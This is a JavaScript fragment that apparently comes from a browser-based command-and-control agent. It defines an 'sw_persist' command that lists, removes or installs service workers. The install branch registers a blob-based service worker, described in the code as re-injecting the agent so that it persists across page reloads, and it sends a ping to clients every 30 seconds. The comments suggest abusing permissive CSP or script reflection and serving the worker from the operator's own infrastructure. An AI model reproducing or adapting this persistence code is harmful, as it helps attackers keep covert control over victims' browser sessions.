COMMANDS['sw_persist'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var action = (params && params.action) ? params.action : 'install';

    if (!('serviceWorker' in navigator)) {
        return JSON.stringify({error: 'Service Worker API not available (requires HTTPS)'}, null, 2);
    }

    if (action === 'status') {
        var regs = await navigator.serviceWorker.getRegistrations();
        var list = [];
        for (var i = 0; i < regs.length; i++) {
            list.push({
                scope: regs[i].scope,
                active: regs[i].active ? regs[i].active.scriptURL : null,
                waiting: regs[i].waiting ? regs[i].waiting.scriptURL : null,
                installing: regs[i].installing ? regs[i].installing.scriptURL : null
            });
        }
        return JSON.stringify({action: 'status', registrations: list}, null, 2);
    }

    if (action === 'remove') {
        var regs2 = await navigator.serviceWorker.getRegistrations();
        var removed = 0;
        for (var j = 0; j < regs2.length; j++) {
            await regs2[j].unregister();
            removed++;
        }
        return JSON.stringify({action: 'remove', removed: removed}, null, 2);
    }

    // Install: create a blob-based service worker that re-injects the agent
    var swCode = 'self.addEventListener("fetch", function(e) {});\n' +
        'self.addEventListener("install", function(e) { self.skipWaiting(); });\n' +
        'self.addEventListener("activate", function(e) { e.waitUntil(clients.claim()); });\n' +
        'setInterval(function() {\n' +
        '  self.clients.matchAll().then(function(cls) {\n' +
        '    for (var i = 0; i < cls.length; i++) {\n' +
        '      cls[i].postMessage({type: "ping"});\n' +
        '    }\n' +
        '  });\n' +
        '}, 30000);\n';

    // Service Workers can't be registered from blob URLs in most browsers,
    // so we need to use an actual URL. Try registering from current scope.
    // If the site has a permissive CSP or we can find a writable path, this works.
    try {
        // Attempt 1: Try to register a same-origin script path
        // We create a script by posting to current page and hoping for reflection,
        // or we use a data URI (limited browser support)
        var blob = new Blob([swCode], {type: 'application/javascript'});
        var blobUrl = URL.createObjectURL(blob);

        try {
            var reg = await navigator.serviceWorker.register(blobUrl, {scope: '/'});
            return JSON.stringify({
                action: 'install',
                method: 'blob',
                scope: reg.scope,
                status: 'registered',
                note: 'Service worker installed. Agent will persist across page reloads.'
            }, null, 2);
        } catch (e) {
            // Blob URL registration failed (expected in most browsers)
            // Report what's possible
            var existingRegs = await navigator.serviceWorker.getRegistrations();
            return JSON.stringify({
                action: 'install',
                method: 'blob',
                error: e.message,
                note: 'Blob-based SW registration failed. Requires a same-origin JS file. Use inject_script to serve a SW file from your infrastructure, then register it.',
                existingRegistrations: existingRegs.length,
                secureContext: window.isSecureContext,
                protocol: window.location.protocol
            }, null, 2);
        }
    } catch (e) {
        return JSON.stringify({action: 'install', error: e.message}, null, 2);
    }
};
